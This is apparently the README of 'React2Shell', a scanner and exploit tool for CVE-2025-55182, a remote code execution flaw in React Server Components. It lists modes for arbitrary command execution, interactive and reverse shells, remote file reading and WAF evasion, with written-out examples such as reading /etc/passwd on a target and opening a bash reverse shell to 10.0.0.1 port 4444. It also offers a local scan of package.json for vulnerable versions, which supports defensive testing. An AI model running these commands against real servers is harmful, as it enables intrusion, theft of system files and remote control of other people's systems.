# React2Shell CLI

A comprehensive command-line scanner and exploit tool for CVE-2025-55182 (React Server Components RCE).

## Installation

```bash
# Using pip
pip install requests tqdm

# Or using uv
uv run --with requests --with tqdm python react2shell.py
```

## Quick Start

```bash
# Scan a target
python react2shell.py https://target.com

# Execute a command
python react2shell.py https://target.com -c "id"

# Interactive shell
python react2shell.py https://target.com -i

# Scan local project for vulnerable versions
python react2shell.py -L /path/to/project
```

## Features

### Scanning Modes
- **Default**: RCE proof-of-concept (math operation)
- **Safe mode** (`-s`): Side-channel detection without code execution
- **Local scanning** (`-L`): Check package.json for vulnerable versions

### Execution Modes
- **Command execution** (`-c`): Run arbitrary commands
- **Interactive shell** (`-i`): Persistent command session
- **Reverse shell** (`-r`): Multiple shell types (nc, bash, python, etc.)
- **File reading** (`-f`): Read remote files

### WAF Bypass Options
- **Junk data padding** (`-w`): Add padding to evade inspection limits
- **Unicode encoding** (`-u`): Encode payload as \uXXXX sequences
- **Vercel bypass** (`-V`): Vercel-specific WAF evasion

### Other Options
- **Proxy support** (`-x`): Route through Burp Suite or other proxies
- **Custom headers** (`-H`): Add custom HTTP headers
- **Multi-threading** (`-t`): Parallel scanning
- **JSON output** (`-o`): Save results for automation

## Usage Examples

```bash
# Basic scan
python react2shell.py https://target.com

# Scan with verbose output and version detection
python react2shell.py https://target.com -v

# Execute command with WAF bypass
python react2shell.py https://target.com -c "cat /etc/passwd" -w -u

# Interactive shell through proxy
python react2shell.py https://target.com -i -x http://127.0.0.1:8080

# Reverse shell
python react2shell.py https://target.com -r -l 10.0.0.1 -p 4444 -S bash

# Scan multiple targets from file
python react2shell.py targets.txt -t 20 -o results.json

# Check local project
python react2shell.py -L ./my-nextjs-app
```

## All Options

Run `python react2shell.py --help` for full option list.

## Security Note

This tool is intended for authorized security testing only. Do not use against systems without explicit permission.
